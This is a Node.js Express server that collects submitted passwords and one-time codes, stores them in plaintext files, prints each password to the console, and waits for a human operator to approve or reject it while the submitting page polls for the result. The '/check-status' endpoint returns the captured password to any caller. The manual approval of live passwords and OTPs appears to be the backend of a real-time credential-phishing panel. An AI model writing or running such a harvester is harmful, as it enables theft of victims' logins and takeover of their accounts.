import express from 'express';
import cors from 'cors';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());

const STATUS_FILE = path.join(__dirname, 'auth-status.json');
const TEST_CRED_FILE = path.join(__dirname, 'test-cred.json');

// Initialize status file if it doesn't exist
async function initStatusFile() {
  try {
    await fs.access(STATUS_FILE);
  } catch {
    await fs.writeFile(STATUS_FILE, JSON.stringify({ status: 'idle', password: '', timestamp: null }));
  }
  
  // Initialize test cred file
  try {
    await fs.access(TEST_CRED_FILE);
  } catch {
    await fs.writeFile(TEST_CRED_FILE, JSON.stringify({ password: '', otp: '', status: 'idle' }));
  }
}

// Submit password for manual verification
app.post('/submit-password', async (req, res) => {
  const { password } = req.body;
  
  const data = {
    status: 'pending',
    password: password,
    timestamp: new Date().toISOString()
  };
  
  await fs.writeFile(STATUS_FILE, JSON.stringify(data, null, 2));
  
  console.log('\n🔐 NEW PASSWORD SUBMISSION 🔐');
  console.log('Password:', password);
  console.log('Status: PENDING');
  console.log('\nTo approve: Edit auth-status.json and change status to "approved"');
  console.log('To reject: Edit auth-status.json and change status to "rejected"\n');
  
  res.json({ success: true, message: 'Password submitted for verification' });
});

// Check verification status
app.get('/check-status', async (req, res) => {
  try {
    const data = await fs.readFile(STATUS_FILE, 'utf-8');
    const status = JSON.parse(data);
    res.json(status);
  } catch (error) {
    res.json({ status: 'idle', password: '', timestamp: null });
  }
});

// Test endpoints for CLI script
app.get('/test/cred', async (req, res) => {
  try {
    const data = await fs.readFile(TEST_CRED_FILE, 'utf-8');
    const cred = JSON.parse(data);
    res.json(cred);
  } catch (error) {
    res.json({ password: '', otp: '', status: 'idle' });
  }
});

app.post('/test/approve', async (req, res) => {
  try {
    const data = await fs.readFile(TEST_CRED_FILE, 'utf-8');
    const cred = JSON.parse(data);
    cred.status = 'approved';
    await fs.writeFile(TEST_CRED_FILE, JSON.stringify(cred, null, 2));
    console.log('✅ Password approved via CLI');
    res.json({ success: true, message: 'Password approved' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/test/reject', async (req, res) => {
  try {
    const data = await fs.readFile(TEST_CRED_FILE, 'utf-8');
    const cred = JSON.parse(data);
    cred.password = '';
    cred.otp = '';
    cred.status = 'rejected';
    await fs.writeFile(TEST_CRED_FILE, JSON.stringify(cred, null, 2));
    console.log('❌ Password rejected via CLI');
    res.json({ success: true, message: 'Password rejected, reset to idle' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/test/reset', async (req, res) => {
  try {
    await fs.writeFile(TEST_CRED_FILE, JSON.stringify({ password: '', otp: '', status: 'idle' }, null, 2));
    console.log('🔄 Test credentials reset via CLI');
    res.json({ success: true, message: 'Test credentials reset' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Reset status (optional, for convenience)
app.post('/reset', async (req, res) => {
  await fs.writeFile(STATUS_FILE, JSON.stringify({ status: 'idle', password: '', timestamp: null }));
  console.log('✅ Status reset to idle');
  res.json({ success: true });

});

// Start server
initStatusFile().then(() => {
  app.listen(PORT, () => {
    console.log(`🚀 Manual verification server running on http://localhost:${PORT}`);
    console.log(`📝 Status file: ${STATUS_FILE}`);
  });
});
